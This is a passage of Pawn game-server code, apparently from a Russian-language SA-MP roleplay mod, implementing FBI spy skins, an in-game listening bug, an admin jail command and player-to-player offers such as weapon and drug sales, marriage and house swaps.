    if(PlayerInfo[playerid][pMember] != 2) return SCM(playerid, COLOR_GREY, " Вам недоступна эта функция!");
 	if(PlayerInfo[playerid][pRank] < 4) return SCM(playerid, COLOR_GREY, " Доступно с 4 ранга");
	new bool:label=false;
 	for(new i = 0; i < 5; i++)
	{
		if(spys[i][0] == -1)
		{
			label = true;
		}
	}
	if(!label) return SCM(playerid, COLOR_GREY, " Одновременно можно назначить не больше 5 шпионов!");
    switch(fracid)
    {
    case 0:
    {
        switch(skinid)
        {
        case 0: SetPlayerSkin(SmenaSkina, 79);
        case 1: SetPlayerSkin(SmenaSkina, 78);
        case 2: SetPlayerSkin(SmenaSkina, 137);
        case 3: SetPlayerSkin(SmenaSkina, 200);
        case 4: SetPlayerSkin(SmenaSkina, 230);
        case 5: SetPlayerSkin(SmenaSkina, 239);
        case 6: SetPlayerSkin(SmenaSkina, 212);
        case 7: SetPlayerSkin(SmenaSkina, 228);
        case 8: SetPlayerSkin(SmenaSkina, 142);
        case 9: SetPlayerSkin(SmenaSkina, 297);
        case 10: SetPlayerSkin(SmenaSkina, 292);
        case 11: SetPlayerSkin(SmenaSkina, 122);
        case 12: SetPlayerSkin(SmenaSkina, 193);
        case 13: SetPlayerSkin(SmenaSkina, 55);
        case 14: SetPlayerSkin(SmenaSkina, 90);
        case 15: SetPlayerSkin(SmenaSkina, 40);
        case 16: SetPlayerSkin(SmenaSkina, 233);
        case 17: SetPlayerSkin(SmenaSkina, 298);
        case 18: SetPlayerSkin(SmenaSkina, 93);
        default: return true;
        }
    }
    case 1:
    {
        switch(skinid)
        {
        case 0: SetPlayerSkin(SmenaSkina, 280);
        case 1: SetPlayerSkin(SmenaSkina, 281);
        case 2: SetPlayerSkin(SmenaSkina, 282);
        case 3: SetPlayerSkin(SmenaSkina, 283);
        case 4: SetPlayerSkin(SmenaSkina, 288);
        case 5: SetPlayerSkin(SmenaSkina, 284);
        case 6: SetPlayerSkin(SmenaSkina, 285);
        case 7: SetPlayerSkin(SmenaSkina, 76);
        case 8: SetPlayerSkin(SmenaSkina, 306);
        case 9: SetPlayerSkin(SmenaSkina, 307);
        case 10: SetPlayerSkin(SmenaSkina, 309);
        case 11: SetPlayerSkin(SmenaSkina, 265);
        case 12: SetPlayerSkin(SmenaSkina, 266);
        case 13: SetPlayerSkin(SmenaSkina, 267);
        case 14: SetPlayerSkin(SmenaSkina, 310);
        case 15: SetPlayerSkin(SmenaSkina, 311);
        case 16: SetPlayerSkin(SmenaSkina, 302);
        case 17: SetPlayerSkin(SmenaSkina, 303);
        case 18: SetPlayerSkin(SmenaSkina, 304);
        case 19: SetPlayerSkin(SmenaSkina, 305);
        default: return true;
        }
    }
    case 2:
    {
        switch(skinid)
        {
        case 0: SetPlayerSkin(SmenaSkina, 287);
        case 1: SetPlayerSkin(SmenaSkina, 191);
        case 2: SetPlayerSkin(SmenaSkina, 179);
        default: return true;
        }
    }
    case 3:
    {
        switch(skinid)
        {
        case 0: SetPlayerSkin(SmenaSkina, 274);
        case 1: SetPlayerSkin(SmenaSkina, 275);
        case 2: SetPlayerSkin(SmenaSkina, 276);
        case 3: SetPlayerSkin(SmenaSkina, 70);
        case 4: SetPlayerSkin(SmenaSkina, 219);
        case 5: SetPlayerSkin(SmenaSkina, 308);
        default: return true;
        }
    }
    case 4:
    {
        switch(skinid)
        {
        case 0: SetPlayerSkin(SmenaSkina, 57);
        case 1: SetPlayerSkin(SmenaSkina, 98);
        case 2: SetPlayerSkin(SmenaSkina, 147);
        case 3: SetPlayerSkin(SmenaSkina, 187);
        case 4: SetPlayerSkin(SmenaSkina, 216);
        default: return true;
        }
    }
    case 5:
    {
        switch(skinid)
        {
        case 0: SetPlayerSkin(SmenaSkina, 59);
        case 1: SetPlayerSkin(SmenaSkina, 240);
        case 2: SetPlayerSkin(SmenaSkina, 150);
        default: return true;
        }
    }
    case 6:
    {
        switch(skinid)
        {
        case 0: SetPlayerSkin(SmenaSkina, 188);
        case 1: SetPlayerSkin(SmenaSkina, 217);
        case 2: SetPlayerSkin(SmenaSkina, 250);
        case 3: SetPlayerSkin(SmenaSkina, 261);
        case 4: SetPlayerSkin(SmenaSkina, 148);
        case 5: SetPlayerSkin(SmenaSkina, 211);
        default: return true;
        }
    }
    case 7:
    {
        switch(skinid)
        {
        case 0: SetPlayerSkin(SmenaSkina, 124);
        case 1: SetPlayerSkin(SmenaSkina, 223);
        case 2: SetPlayerSkin(SmenaSkina, 113);
        case 3: SetPlayerSkin(SmenaSkina, 91);
        default: return true;
        }
    }
    case 8:
    {
        switch(skinid)
        {
        case 0: SetPlayerSkin(SmenaSkina, 123);
        case 1: SetPlayerSkin(SmenaSkina, 186);
        case 2: SetPlayerSkin(SmenaSkina, 120);
        case 3: SetPlayerSkin(SmenaSkina, 169);
        case 4: SetPlayerSkin(SmenaSkina, 117);
        case 5: SetPlayerSkin(SmenaSkina, 118);
        default: return true;
        }
    }
    case 9:
    {
        switch(skinid)
        {
        case 0: SetPlayerSkin(SmenaSkina, 272);
        case 1: SetPlayerSkin(SmenaSkina, 112);
        case 2: SetPlayerSkin(SmenaSkina, 125);
        case 3: SetPlayerSkin(SmenaSkina, 214);
        case 4: SetPlayerSkin(SmenaSkina, 111);
        default: return true;
        }
    }
    case 10:
    {
        switch(skinid)
        {
        case 0: SetPlayerSkin(SmenaSkina, 175);
        case 1: SetPlayerSkin(SmenaSkina, 174);
        case 2: SetPlayerSkin(SmenaSkina, 173);
        case 3: SetPlayerSkin(SmenaSkina, 226);
        default: return true;
        }
    }
    case 11:
    {
        switch(skinid)
        {
        case 0: SetPlayerSkin(SmenaSkina, 105);
        case 1: SetPlayerSkin(SmenaSkina, 106);
        case 2: SetPlayerSkin(SmenaSkina, 107);
        case 3: SetPlayerSkin(SmenaSkina, 269);
        case 4: SetPlayerSkin(SmenaSkina, 271);
        case 5: SetPlayerSkin(SmenaSkina, 270);
        case 6: SetPlayerSkin(SmenaSkina, 56);
        default: return true;
        }
    }
    case 12:
    {
        switch(skinid)
        {
        case 0: SetPlayerSkin(SmenaSkina, 102);
        case 1: SetPlayerSkin(SmenaSkina, 103);
        case 2: SetPlayerSkin(SmenaSkina, 104);
        case 3: SetPlayerSkin(SmenaSkina, 195);
        default: return true;
        }
    }
    case 13:
    {
        switch(skinid)
        {
        case 0: SetPlayerSkin(SmenaSkina, 108);
        case 1: SetPlayerSkin(SmenaSkina, 109);
        case 2: SetPlayerSkin(SmenaSkina, 110);
        case 3: SetPlayerSkin(SmenaSkina, 190);
        default: return true;
        }
    }
    case 14:
    {
        switch(skinid)
        {
        case 0: SetPlayerSkin(SmenaSkina, 114);
        case 1: SetPlayerSkin(SmenaSkina, 116);
        case 2: SetPlayerSkin(SmenaSkina, 115);
        case 3: SetPlayerSkin(SmenaSkina, 41);
        default: return true;
        }
    }
    case 15:
    {
        switch(skinid)
        {
        case 0: SetPlayerSkin(SmenaSkina, 100);
        case 1: SetPlayerSkin(SmenaSkina, 247);
        case 2: SetPlayerSkin(SmenaSkina, 248);
        case 3: SetPlayerSkin(SmenaSkina, 254);
        case 4: SetPlayerSkin(SmenaSkina, 246);
        case 5: SetPlayerSkin(SmenaSkina, 64);
        case 6: SetPlayerSkin(SmenaSkina, 131);
        case 7: SetPlayerSkin(SmenaSkina, 198);
        case 8: SetPlayerSkin(SmenaSkina, 181);
        default: return true;
        }
    }
    default: return true;
    }
    label=false;
    for(new i = 0; i < 5; i++)
	{
		if(spys[i][0] == SmenaSkina)
		{
		    label = true;
			spys[i][1] = fracid;
		    break;
		}
	}
	if(!label)
	{
        format(YCMDstr, 80, " %s назначил %s шпионом", PlayerInfo[playerid][pName], PlayerInfo[SmenaSkina][pName]);
		SendFamilyMessage(2, 0x00b953ff, YCMDstr);
		for(new i = 0; i < 5; i++)
		{
			if(spys[i][0] == -1)
			{
			    spys[i][0] = SmenaSkina;
			    spys[i][1] = fracid;
			    break;
			}
		}
	}
	return true;
}
CMD:tjail(playerid, params[])
{
	if(!IsPlayerConnected(playerid)) return true;
	if(PlayerInfo[playerid][pAdmin] < 1) return true;
	if(dostup[playerid] != 1) return true;
	if(sscanf(params, "u", params[0])) return SCM(playerid, -1, " Введите: /tjail [playerid]");
	if(!IsPlayerConnected(params[0]) || params[0] == INVALID_PLAYER_ID) return SCM(playerid, COLOR_GREY, " Игрок не найден");
	if(PlayerInfo[params[0]][pJailTime] == 0) SCM(playerid, COLOR_GREY, " Игрок не находится в камере");
	format(YCMDstr, 42, " Игрок выйдет из тюрьмы через %i секунд", PlayerInfo[params[0]][pJailTime]-1);
	SCM(playerid, -1, YCMDstr);
	return true;
}
CMD:atipster(playerid, params[])
{
	if(dostup[playerid] != 1) return true;
	if(PlayerInfo[playerid][pAdmin] < 1) return 1;
	if(sscanf(params, "d",params[0])) return SCM(playerid, -1, " Введите: /atipster [ид фракции] 0 - отключить");
	if(params[0] > 33 || params[0] < 0) return SCM(playerid, COLOR_GREY, " Нельзя меньше 0 или больше 33");
	SetPVarInt(playerid,"Atisper",params[0]);
	if(params[0] == 0) SCM(playerid, -1, " Прослушка активирована. Используйте ид фракции 0 для отключения");
	else SCM(playerid, -1, " Прослушка активирована. Используйте ид фракции 0 для отключения");
	return 1;
}
CMD:tipster(playerid, params[])
{
	new param[40];
	if(PlayerInfo[playerid][pMember] != 2)return SCM(playerid, COLOR_GREY, " Вы не агент FBI");
	if(sscanf( params, "s[32]S()[64]", param, params ))
	{
		SCM(playerid, -1, " Введите: /tipster {FFFF00}get {FFFFFF}или {FFFF00}set {FFFFFF}или {FFFF00}remove {FFFFFF}или {FFFF00}listen");
		return true;
	}
	if(!strcmp(param, "get",true))
	{
		new bool:label=false;
		for(new i = 0; i < 5; i++)
		{
		    if(spys[i][0] == playerid)
		    {
		        label = true;
		    }
		}
		if(!label) return SCM(playerid, COLOR_GREY, " Вы не шпион");
		if(GetPlayerVehicleID(playerid) >= fbicar[0] && GetPlayerVehicleID(playerid) <= fbicar[16]) {}
		else return SCM(playerid,COLOR_GREY," Вы должны находиться в автомобиле FBI");
		if(tipster != -1) return SCM(playerid,COLOR_GREY," Жучок используется другим шпионом");
		tipster = playerid;
		format(YCMDstr,sizeof(YCMDstr)," %s взял(а) жучок",Name(playerid));
		SendRadioMessage(2,0x00b953ff, YCMDstr);
	}
	else if(!strcmp(param, "set",true))
	{
		new ammo;
		if(sscanf( params, "u", ammo ) ) return SCM(playerid, -1, " Введите: /tipster SET [playerid]");
		if(tipster != playerid) return SCM(playerid,COLOR_GREY," У вас нет жучка");
		if(!ProxDetectorS(3.0, playerid, ammo)) return SCM(playerid,COLOR_GREY," Человек должен находиться от 3ёх метрах от вас");
	//	if(tipsteron != -1) return SCM(playerid,COLOR_ISPOLZUY," жучок уже прикреплен! Используйте /tipster REMOVE");
		if(!PlayerInfo[ammo][pMember]) return SCM(playerid,COLOR_GREY," Игрок не состоит в организации");
		tipsteron = PlayerInfo[ammo][pMember];
		tipsterplayer = ammo;
		format(YCMDstr,sizeof(YCMDstr)," %s установил жучок на %s. Чтобы подключиться к волне, введите /tipster listen",Name(playerid),Name(ammo));
		SendRadioMessage(2,0x00b953ff, YCMDstr);
	}
	else if(!strcmp(param, "remove",true))
	{
		if(tipster == -1) return SCM(playerid,COLOR_GREY," Жучок не прикреплен!");
		tipster = -1;
		tipsteron = -1;
		tipsterplayer = -1;
		format(YCMDstr,sizeof(YCMDstr)," %s деактивировал жучок",Name(playerid));
		SendRadioMessage(2,0x00b953ff, YCMDstr);
	}
	else if(!strcmp(param, "listen",true))
	{
		if(tipsteron == -1) return SCM(playerid,COLOR_GREY," Жучок не прикреплен!");
		if(!tipsterlisten[playerid])
		{
			tipsterlisten[playerid] = 1;
			SCM(playerid,0x00b953ff," Вы начали прослушивание!");
		}
		else
		{
			tipsterlisten[playerid] = 0;
			SCM(playerid,0x00b953ff," Вы закончили прослушивание!");
		}
	}
	return true;
}
CMD:cancel(playerid, params[])
{
	if(!PlayerInfo[playerid][pLogin]) return true;
	return ShowPlayerDialogEx(playerid,1757,DIALOG_STYLE_LIST,"Отменить","Нарко (/selldrugs)\nРемонт (/repair)\nЗаправка (/refill)\nИнтервью\nВызов полиции\nВызов медика\nВызов механика\nВызов такси\nОбмен транспортом (/changecar)\nАвтоугон\nОтмена ставки", "Готово", "Отмена");
}
publics: GunTimer(playerid)
{
	SetPVarInt(playerid, "Hour_Gun", 0);
}
publics: DrugsTimer(playerid)
{
	SetPVarInt(playerid, "Hour_Drugs", 0);
}
CMD:accept(playerid, params[])
{
	new sendername[MAX_PLAYER_NAME],giveplayer[MAX_PLAYER_NAME];
	new x_job[64];
	
	new strs[32];
	format(string, sizeof(string), "");
	if(GetPVarInt(playerid,"Sell_Gun") > 0)// покупка оружия
	{
		format(strs, sizeof(strs), "Купить оружие\n");
		strcat(string, strs);
	}
	if(KrishaOffer[playerid] != 999)
	{
	    format(strs, sizeof(strs), "Крыша\n");
		strcat(string, strs);
	}
	if(ProposeOffer[playerid] != 999)
	{
	    format(strs, sizeof(strs), "Свадьба\n");
		strcat(string, strs);
	}
	if(JobOffer[playerid] != 999)
	{
	    format(strs, sizeof(strs), "Контракт\n");
		strcat(string, strs);
	}
	if(TicketOffer[playerid] != 999)
	{
	    format(strs, sizeof(strs), "Штраф\n");
		strcat(string, strs);
	}
	if(DrugOffer[playerid] != 999)
	{
	    format(strs, sizeof(strs), "Наркотики\n");
		strcat(string, strs);
	}
	if(BoyOffer[playerid] != 999)
	{
	    format(strs, sizeof(strs), "Бой\n");
		strcat(string, strs);
	}
	if(GetPVarInt(playerid,"_changehouse"))
	{
	    format(strs, sizeof(strs), "Покупка дома\n");
		strcat(string, strs);
	}
	if(RefillOffer[playerid] != 999)
	{
	    format(strs, sizeof(strs), "Заправка\n");
		strcat(string, strs);
	}
	if(RepairOffer[playerid] != 999)
	{
	    format(strs, sizeof(strs), "Починка\n");
		strcat(string, strs);
	}
	if(ZoneOffer[playerid] != 999)
	{
	    format(strs, sizeof(strs), "Территории\n");
		strcat(string, strs);
	}
	if(KeysOffer[playerid] != 999)
	{
		format(strs, sizeof(strs), "Ключи от камеры\n");
		strcat(string, strs);
	}
	if(GetPVarInt(playerid,"h_id"))
	{
	    format(strs, sizeof(strs), "Хот Дог\n");
		strcat(string, strs);
	}
	if(FreeOffer[playerid] != 999)
	{
	    format(strs, sizeof(strs), "Выход из тюрьмы\n");
		strcat(string, strs);
	}
	if(strlen(string) == 0) return SCM(playerid, COLOR_GREY, " Нет ни одного предложения");
	if(sscanf(params, "s[32]",x_job)) return ShowPlayerDialogEx(playerid, 13954, DIALOG_STYLE_LIST, "Предложения", string, "Подтвердить", "Назад");
	if(strcmp(x_job,"gun",true) == 0)
	{
		if(GetPVarInt(playerid,"Sell_Gun") <= 0) return SCM(playerid,COLOR_GREY," Вам не предлагали купить оружие!");
		if(!ProxDetectorS(4.0, playerid, GetPVarInt(playerid,"Sell_GunId"))) return SCM(playerid, COLOR_GREY," Игрок слишком далеко!");
		if(PlayerInfo[playerid][pCash] < GetPVarInt(playerid,"Sell_GunPrice")) return SCM(playerid,COLOR_GRAD1, " У вас недостаточно денег");
		PlayerInfo[playerid][pCash]-=GetPVarInt(playerid,"Sell_GunPrice");
		PlayerInfo[GetPVarInt(playerid,"Sell_GunId")][pCash]+=GetPVarInt(playerid,"Sell_GunPrice");
		PlayerInfo[GetPVarInt(playerid,"Sell_GunId")][pMats]-=GetPVarInt(playerid,"Sell_GunMats");
		if(booston == 0) GiveWeapon(playerid,GetPVarInt(playerid,"Sell_Gun"),GetPVarInt(playerid,"Sell_GunAmmo"));
		else if(booston == 1) GiveWeapon(playerid,GetPVarInt(playerid,"Sell_Gun"),GetPVarInt(playerid,"Sell_GunAmmo")*3);
		format(string, 128, " %s сделал оружие из материалов %s",Name(GetPVarInt(playerid,"Sell_GunId")),Name(playerid));
		ProxDetector(10.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		DeletePVar(playerid,"Sell_Gun");
		DeletePVar(playerid,"Sell_GunAmmo");
		DeletePVar(playerid,"Sell_GunPrice");
		DeletePVar(playerid,"Sell_GunMats");
		if(GetPVarInt(playerid, "Hour_Gun") == 0 && !IsAGang(playerid))
		{
			SetPVarInt(playerid,"Hour_Gun", 1);
            SetTimerEx("GunTimer" , 3600000, false, "i", playerid);
            PlayerInfo[GetPVarInt(playerid, "Sell_GunId")][pGRating] += 100;
            switch(PlayerInfo[GetPVarInt(playerid, "Sell_GunId")][pMember])
            {
                case 12: gRating[Ballas] += 100;
                case 13: gRating[Vagos]  += 100;
                case 15: gRating[Grove]  += 100;
                case 17: gRating[Aztec]  += 100;
                case 18: gRating[Rifa]   += 100;
            }
		}
		DeletePVar(playerid,"Sell_GunId");
		return true;
	}
	else if(strcmp(x_job, "ekey",true) == 0)
	{
		if(KeysOffer[playerid] < 999)
		{
			GetPlayerName(KeysOffer[playerid], giveplayer, sizeof(giveplayer));
			GetPlayerName(playerid, sendername, sizeof(sendername));
			if(PlayerInfo[playerid][pCash] < KeysPrice[playerid]) return SCM(playerid, COLOR_GREY, " У вас нет столько денег!");
			if(PlayerInfo[playerid][pKeys] >= 5) return SCM(playerid, COLOR_GREY, " У вас уже есть 5 ключей!");
			PlayerInfo[playerid][pKeys] += KeysGram[playerid];
			PlayerInfo[KeysOffer[playerid]][pKeys] -= KeysGram[playerid];
			PlayerInfo[playerid][pCash] -= KeysPrice[playerid];
			format(string, 128, " Вы купили у %s %i ключей за %i вирт", giveplayer, KeysGram[playerid], KeysPrice[playerid]);
			SCM(playerid, 0x6495EDFF, string);
			format(string, 128, " %s купил у вас %i ключей за %i вирт", sendername, KeysGram[playerid], KeysPrice[playerid]);
			SCM(KeysOffer[playerid], 0x6495EDFF, string);
			format(string, 20, "~r~-$%i",KeysPrice[playerid]);
			GameTextForPlayer(playerid, string, 5000, 1);
			format(string, 20, "~g~+$%i",KeysPrice[playerid]);
			GameTextForPlayer(KeysOffer[playerid], string, 5000, 1);
			KeysOffer[playerid] = 999;
			return true;
		}
		else
		{
			SCM(playerid, COLOR_GREY, " Нет такого предложения");
			return true;
		}
	}
	else if(strcmp(x_job, "debt",true) == 0)
	{
		if(KrishaOffer[playerid] < 999)
		{
			GetPlayerName(KrishaOffer[playerid], giveplayer, sizeof(giveplayer));
			GetPlayerName(playerid, sendername, sizeof(sendername));
			format(string, 128, " Вы приняли крышу от %s'a", giveplayer);
			SCM(playerid, 0x6495EDFF, string);
			format(string, 128, " %s согласился на вашу крышу", sendername);
			SCM(KrishaOffer[playerid], 0x6495EDFF, string);
			KrishaOffer[playerid] = 999;
			PlayerInfo[playerid][pUseKrisha] = 1;
			PlayerInfo[playerid][pKrisha] = Krisha[playerid];
			return true;
		}
		else
		{
			SCM(playerid, COLOR_GREY, " Вам ни кто не предлагал крышу");
			return true;
		}
	}
	else if(strcmp(x_job, "propose",true) == 0)
	{
		if(ProposeOffer[playerid] < 999)
		{
			if(!PlayerToPoint(10.0, playerid, -1988.6638,1117.8837,54.4726)) return SCM(playerid, COLOR_GREY, " Вы не у церкви в San Fierro!");
			if(IsPlayerConnected(ProposeOffer[playerid]))
			{
				if(ProxDetectorS(10.0, playerid, ProposeOffer[playerid]))
				{
					GetPlayerName(ProposeOffer[playerid], giveplayer, sizeof(giveplayer));
					GetPlayerName(playerid, sendername, sizeof(sendername));
					format(string, 128, " Вы приняли предложение от %s's", giveplayer);
					SCM(playerid, 0x6495EDFF, string);
					format(string, 128, " %s приняла Ваш запрос быть Вашей Женой.", sendername);
					SCM(ProposeOffer[playerid], 0x6495EDFF, string);
					strmid (PlayerInfo[playerid][pMarriedTo],giveplayer, 0, strlen(giveplayer), 32);
					strmid (PlayerInfo[ProposeOffer[playerid]][pMarriedTo],sendername, 0, strlen(sendername), 32);
					PlayerInfo[ProposeOffer[playerid]][pCash] -= 100000;
					ProposedTo[playerid] = 999;
					ProposeOffer[playerid] = 999;
				}
				return true;
			}
			else
			{
				SCM(playerid, COLOR_GREY, "Жених/Невеста не рядом с Вам!");
				return true;
			}
		}
		else
		{
			SCM(playerid, COLOR_GREY, " Вам ни кто не предлагал!");
			return true;
		}
	}
	else if(strcmp(x_job, "gcontract",true) == 0)
	{
		if(JobOffer[playerid] == 999) return SCM(playerid, COLOR_GREY, " Вам никто не предлогал контракт");
		if(Employer[playerid] != 999) return SCM(playerid, COLOR_GREY, " Вы уже заключили контракт");
		if(Prorab[JobOffer[playerid]] == false) return SCM(playerid,COLOR_GREY, " Ошибка. Прораб уже не на работе");
		if(!IsPlayerInRangeOfPoint(playerid,10.0,2127.5701,-2275.1938,20.6719)) SCM(playerid,-1, " Ошибка. Вы должны быть у раздевалки");
		if(!IsPlayerConnected(JobOffer[playerid])) return SCM(playerid,-1, " Игрок не в стеи");
		if(!ProxDetectorS(5.0, playerid, JobOffer[playerid])) return SCM(playerid,-1, " Ошибка. Вы должны находиться рядом с игроком");
		GetPlayerName(JobOffer[playerid], giveplayer, sizeof(giveplayer));
		GetPlayerName(playerid, sendername, sizeof(sendername));
		Employer[playerid] = JobOffer[playerid];
		JobOffer[playerid] = 999;
		format(string, 128, " Вы приняли предложение %s", giveplayer);
		SCM(playerid, 0x6495EDFF, string);
		format(string, 128, " %s принял ваше предложение.", sendername);
		SCM(Employer[playerid], 0x6495EDFF, string);
		SCM(Employer[playerid], 0x6495EDFF, "(( /gpayday - выдать зарплату ))");
		
	}
	else if(strcmp(x_job, "ticket",true) == 0)
	{
		if(TicketOffer[playerid] < 999)
		{
			if(IsPlayerConnected(TicketOffer[playerid]))
			{
				if (ProxDetectorS(5.0, playerid, TicketOffer[playerid]))
				{
					GetPlayerName(TicketOffer[playerid], giveplayer, sizeof(giveplayer));
					GetPlayerName(playerid, sendername, sizeof(sendername));
					format(string, 128, " Вы оплатили штраф в размере %i вирт офицеру %s.", TicketMoney[playerid], giveplayer);
					SCM(playerid, COLOR_BLUE, string);
					format(string, 128, " %s оплатил штраф в размере %i вирт.", sendername, TicketMoney[playerid]);
					SCM(TicketOffer[playerid], COLOR_BLUE, string);
					PlayerInfo[playerid][pCash] -=TicketMoney[playerid];
					PlayerInfo[TicketOffer[playerid]][pCash] +=TicketMoney[playerid];
					TicketOffer[playerid] = 999;
					TicketMoney[playerid] = 0;
					return true;
				}
				else
				{
					SCM(playerid, COLOR_GREY, "Полицейскйи не рядом с вами!");
					return true;
				}
			}
		}
		else
		{
			SCM(playerid, COLOR_GREY, " Вам не выписывали штраф!");
			return true;
		}
	}
	else if(strcmp(x_job, "drugs",true) == 0)
	{
		if(DrugOffer[playerid] < 999)
		{
			if(PlayerInfo[playerid][pCash] > DrugPrice[playerid])
			{
				if(PlayerInfo[playerid][pDrugs] <= (150 - DrugGram[playerid]))
				{
					if(IsPlayerConnected(DrugOffer[playerid]))
					{
						GetPlayerName(DrugOffer[playerid], giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						format(string, 128, " Вы купили %i грамм наркотиков за %i вирт у %s.",DrugGram[playerid],DrugPrice[playerid],giveplayer);
						SCM(playerid, 0x6495EDFF, string);
						format(string, 128, " %s купил у вас %i грамм наркотиков за %i вирт",sendername,DrugGram[playerid],DrugPrice[playerid]);
						SCM(DrugOffer[playerid], 0x6495EDFF, string);
						PlayerInfo[playerid][pCash] -=DrugPrice[playerid];
						GiveMoney(DrugOffer[playerid], DrugPrice[playerid]);
						PlayerInfo[playerid][pDrugs] += DrugGram[playerid];
						PlayerInfo[DrugOffer[playerid]][pDrugs] -= DrugGram[playerid];
						if(GetPVarInt(playerid, "Hour_Drugs") == 0 && !IsAGang(playerid))
						{
							SetPVarInt(playerid,"Hour_Drugs", 1);
				            SetTimerEx("DrugsTimer" , 3600000, false, "i", playerid);
				            PlayerInfo[DrugOffer[playerid]][pGRating] += 100;
				            switch(PlayerInfo[DrugOffer[playerid]][pMember])
				            {
				                case 12: gRating[Ballas] += 100;
				                case 13: gRating[Vagos]  += 100;
				                case 15: gRating[Grove]  += 100;
				                case 17: gRating[Aztec]  += 100;
				                case 18: gRating[Rifa]   += 100;
				            }
						}
						DrugOffer[playerid] = 999;
						return true;
					}
					return true;
				}
				else
				{
					SCM(playerid, COLOR_GREY, " У Вас и так достаточно наркотиков!");
					return true;
				}
			}
			else
			{
				SCM(playerid, COLOR_GREY, " У вас нет столько денег!");
				return true;
			}
		}
		else
		{
			SCM(playerid, COLOR_GREY, " Вам никто не предлагал купить наркотики!");
			return true;
		}
	}
	else if(strcmp(x_job, "fight",true) == 0)
	{
		new i = BoyOffer[playerid];
		new ccount = 0;
		foreach(q)
		{
			if(PlayerInfo[q][pJob] == 6 || PlayerInfo[q][pLogin] != 0) ccount++;
			if(ccount == 0)
			{
				if(BoyOffer[playerid] == 999) return SCM(playerid,COLOR_GREY," Вам никто не предлагал драться");
				if(training[playerid] == 0) return SCM(playerid,COLOR_GREY," Вы должны переодеться в раздевалке");
				if(boyidet != false) return SCM(playerid,COLOR_GREY," Подождите! На ринге уже идет бой");
				SetPlayerInterior(playerid,5);
				SetPlayerPos(playerid,762.7874,2.2635,1001.5942);
				SetPlayerFacingAngle(playerid, 133.9088);
				//===========================================//
				SetPlayerInterior(playerid,5);
				SetPlayerPos(i,758.7249,-1.9224,1001.5942);
				SetPlayerFacingAngle(playerid, 316.2242);
				if(training[playerid] == 2) training[playerid] = 1337;
				if(training[i] == 2) training[i] = 1337;
				else if(training[playerid] == 4) training[playerid] = 1338;
				else if(training[i] == 4) training[i] = 1338;
				else if(training[playerid] == 6) training[playerid] = 1339;
				else if(training[i] == 6) training[i] = 1339;
				TogglePlayerControllable(playerid, 0);
				SetTimerEx("UnFreeze" , 2000, false, "i", playerid);
				TogglePlayerControllable(i, 0);
				SetTimerEx("UnFreeze" , 2000, false, "i", i);
				boyidet = true;
				GameTextForPlayer(playerid, "~r~FIGHT", 2500, 3);
				GameTextForPlayer(i, "~r~FIGHT", 2500, 3);
				BoyOffer[playerid] = 999;
			}
			else
			{
				new Float:XX,Float:YY,Float:ZZ;
				GetPlayerPos(q,XX,YY,ZZ);
				if(IsPlayerInRangeOfPoint(playerid, 10, XX,YY,ZZ))
				{
					if(PlayerInfo[q][pJob] == 6 || PlayerInfo[q][pLogin] != 0) SetPVarInt(q,"startfight",playerid);
					if(PlayerInfo[q][pJob] == 6 || PlayerInfo[q][pLogin] != 0) SetPVarInt(q,"startfighter",i);
					if(PlayerInfo[q][pJob] == 6 || PlayerInfo[q][pLogin] != 0) SendMes(q,COLOR_BLUE," %s и %s хотят провести бой. {FFFFFF}(( /startfight - чтобы начать бой ))",Name(playerid),Name(i));
					SCM(playerid,-1," Подождите пока тренер устроит вам поединок");
				}
			}
		}
	}
	else if(strcmp(x_job, "house",true) == 0)
	{
		/*if(GetPVarInt(playerid,"changehouse"))
		{
			new i = GetPVarInt(playerid,"changehouse")-1;
			if(!HGet(playerid)) return SCM(playerid,COLOR_GREY,"У вас нет дома!"), DeletePVar(playerid,"changehouse_price"), DeletePVar(playerid,"changehouse_"), DeletePVar(i,"_changehouse"), DeletePVar(playerid,"changehouse");
			if(GetPVarInt(playerid,"changehouse_")) return SCM(playerid,COLOR_GREY," Вы уже подтвердили сделку!");
			SetPVarInt(playerid,"changehouse_",1);
			SCM(playerid,0x6495EDFF," Вы подтвердили сделку!");
			SCM(i,0x6495EDFF,"Игрок подтвердил сделку!");
			SCM(i,0x6495EDFF,"(( Введите /(ac)cept house для продолжения! ))");
			return true;
		}
		else */if(GetPVarInt(playerid,"_changehouse"))
		{
			new i = GetPVarInt(playerid,"_changehouse")-1;
			if(!GetPVarInt(i,"changehouse_")) return SCM(playerid,COLOR_GREY," Игрок ещё не подтвердил сделку!");
			if(!HGet(i)) return SCM(playerid,COLOR_GREY," У игрока нет дома!"), DeletePVar(i,"changehouse"), DeletePVar(i,"changehouse_price"), DeletePVar(i,"changehouse_"), DeletePVar(playerid,"_changehouse");
			//HGet(playerid);
			new str[10], str_[10];
			if(HGet(playerid))
			{
				switch(HouseInfo[PlayerInfo[playerid][pPHouseKey]][hKlass])
				{
				case 0: str = "Nope"; case 1: str = "D"; case 2: str = "C";
				case 3: str = "B"; case 4: str = "A"; default: str = "S";
				}
			} else str = "Нет";
			switch(HouseInfo[PlayerInfo[i][pPHouseKey]][hKlass])
			{
			case 0: str_ = "Nope"; case 1: str_ = "D"; case 2: str_ = "C";
			case 3: str_ = "B"; case 4: str_ = "A"; case 5: str_ = "S";
			}
			if(HGet(playerid))
			{
				format(string,250,"Вы собираетесь обменяться домами с %s\n\nВаш дом:\n\tНомер дома: [%i]\n\tКласс дома: [%s]\n\nДом игрока:\n\tНомер дома: [%i]\n\tКласс дома: [%s]\n\tДоплата: [%i вирт]",PlayerInfo[playerid][pName],PlayerInfo[i][pPHouseKey],str_,PlayerInfo[playerid][pPHouseKey],str,GetPVarInt(i,"changehouse_price"));
				ShowPlayerDialogEx(i,0, 0,"Обмен домами",string,"Закрыть","");
				format(string,250,"Вы собираетесь обменяться домами с %s\n\nВаш дом:\n\tНомер дома: [%i]\n\tКласс дома: [%s]\n\nДом игрока:\n\tНомер дома: [%i]\n\tКласс дома: [%s]\n\tВаша доплата: [%i вирт]",PlayerInfo[i][pName],PlayerInfo[playerid][pPHouseKey],str,PlayerInfo[i][pPHouseKey],str_,GetPVarInt(i,"changehouse_price"));
				ShowPlayerDialogEx(playerid,1565, 0,"Обмен домами",string,"Обмен","Отмена");
				SetPVarInt(playerid,"changehouse_h",1);
			}
			else
			{
